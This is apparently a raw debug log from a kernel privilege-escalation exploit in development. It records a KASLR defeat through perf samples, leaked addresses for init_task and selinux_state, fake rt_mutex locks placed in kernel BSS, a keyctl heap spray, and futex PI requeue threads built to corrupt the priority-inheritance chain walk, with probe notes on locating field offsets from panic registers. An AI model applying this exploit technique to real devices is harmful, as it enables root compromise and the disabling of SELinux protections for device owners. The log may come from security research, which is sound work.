[main] g_iov_idx=0 (override with IOV_IDX=k)  spray=keyctl
[kaslr] perf text-base=ffffffd8c2000000 min_kip=ffffffd8c20a20a0 samples=6
[kaslr] base=0xffffffd8c2000000 slide=0x18ba000000
  init_task   = 0xffffffd8ccc43640
  selinux_state = 0xffffffd8ccda9d78 (enforcing @ +0)
  fake_lock   = 0xffffffd8ccdca880 (uid_lock+0x200, ZEROED BSS rt_mutex)
  fake_lock2  = 0xffffffd8ccdca980 (uid_lock+0x300, ZEROED BSS rt_mutex)
  safe_write  = 0xffffffd8ccd53000 (empty_zero_page: low byte 0x00, byte2 0x53)
[Y] tid=9080
[X] tid=9081
[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle
[main] CMP_REQUEUE_PI returned -35 (Resource deadlock would occur)
[main] -EDEADLK: full chainwalk caught PI cycle
[Y] PROBE spray: DISTINCT sentinels base=SENT(100+i) len=SENT(200+i) in all 8 iovs; lock LEFT as sentinel so walk faults at first lock deref. Panic FAR/x27 = the sentinel value at the lock field -> pins base-vs-len AND the iov index of the lock field (i.e. the displacement D).
[Y] SPRAY-DEBUG iovstack base=0x274078  &iov[4]=0x2740b8  method=keyctl
[Z] tid=9082
[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on
[do_2] Z blocked on L2 — chain walk survived
[do_2] PROBE: full two-phase (settle + write) with sentinels
[do_2] PHASE1: settle ghost (lock=fake_lock@iov[4], other fields=sentinels)
